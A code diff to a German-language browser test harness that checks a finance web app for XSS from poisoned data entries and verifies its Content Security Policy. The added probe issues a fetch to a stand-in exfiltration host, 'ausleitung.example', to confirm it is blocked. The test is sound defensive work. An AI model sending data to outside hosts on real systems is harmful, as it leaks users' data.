@@ -1,7 +1,8 @@
 // Sicherheit: echte Daten mit Gift-Einträgen laden, alle Ansichten durchklicken, ausgeführtes Fremd-Script zählen.
 // Zweitens: „Kurse aktualisieren“ darf kein Script von fremden Servern nachladen. Wird VOR store.js eingebunden.
 (function () {
-  var errs = [], hits = {}, fields = [], step = 'start', foreign = [];
+  var errs = [], hits = {}, fields = [], step = 'start', foreign = [], viol = [];
+  document.addEventListener('securitypolicyviolation', function (e) { viol.push(e.effectiveDirective + ' ' + e.blockedURI); });
   window.addEventListener('error', function (e) { if (e.message) errs.push(step + ': ' + e.message + ' @' + (e.filename || '').split('/').pop() + ':' + e.lineno); });
   window.__x = function (n, el) {
     var f = fields[n] || ('#' + n), w = where(el), k = step + (w ? ' @' + w : '');
@@ -80,6 +81,15 @@
     if (first(S.espp && S.espp.zyklen)) add('ESPP Zyklus', function () { esppEditZyklus(S.espp.zyklen[0].id); });
     add('Budget neu', function () { nav('budget'); bgtOpenAdd(); });
     add('Budget bearbeiten', function () { bgtStartEdit(S.categories[0].id); });
+    // CSP: Abruf an fremden Server muss blockiert werden; Excel-Bibliothek lädt mit Prüfsumme
+    add('CSP fremder Server', function () {
+      window.__cspProbe = 'offen';
+      fetch('https://ausleitung.example/x?d=1').then(function () { window.__cspProbe = 'durchgelassen'; }, function () {});
+    });
+    add('Excel-Bibliothek', function () {
+      window.__xlsx = 'laedt';
+      _loadXLSX(function () { window.__xlsx = (window.XLSX && XLSX.version) || 'ohne XLSX'; }, function () { window.__xlsx = 'Ladefehler'; });
+    });
     // Kurse: fetch beantwortet sofort mit Schein-Kursen, damit kein echter Abruf läuft
     add('Kurse aktualisieren', function () {
       var r = { USD: 1.1, GBP: 0.9, CHF: 0.95, JPY: 160, SEK: 11, NOK: 11, DKK: 7.4 };
@@ -96,12 +106,15 @@
         return;
       }
       setTimeout(function () {
+        var csp = viol.filter(function (v) { return v.indexOf('ausleitung.example') >= 0; }).length > 0 && window.__cspProbe !== 'durchgelassen';
+        var other = viol.filter(function (v) { return v.indexOf('ausleitung.example') < 0; });
+        var xok = window.__xlsx === '0.20.3';
         var hitList = Object.keys(hits).map(function (f) { return f + ' [' + hits[f].slice(0, 12).join(', ') + ']'; });
         var pre = document.createElement('pre'); pre.id = 'out';
         pre.textContent = JSON.stringify({
-          pass: hitList.length === 0 && foreign.length === 0 && errs.length === 0,
-          info: steps.length + ' Ansichten, ' + fields.length + ' Gift-Eintraege, ' + hitList.length + ' Felder ausgefuehrt, fremde Scripte: ' + foreign.length,
-          errors: hitList.map(function (h) { return 'XSS ' + h; }).concat(foreign.map(function (h) { return 'Fremdes Script ' + h; })).concat(errs)
+          pass: hitList.length === 0 && foreign.length === 0 && errs.length === 0 && csp && !other.length && xok,
+          info: steps.length + ' Ansichten, ' + fields.length + ' Gift-Eintraege, ' + hitList.length + ' Felder ausgefuehrt, fremde Scripte: ' + foreign.length + ', CSP sperrt: ' + (csp ? 'ja' : 'NEIN') + ', XLSX: ' + window.__xlsx,
+          errors: hitList.map(function (h) { return 'XSS ' + h; }).concat(foreign.map(function (h) { return 'Fremdes Script ' + h; })).concat(other.map(function (v) { return 'CSP blockiert Erlaubtes: ' + v; })).concat(errs)
         });
         document.body.appendChild(pre);
       }, 1500);
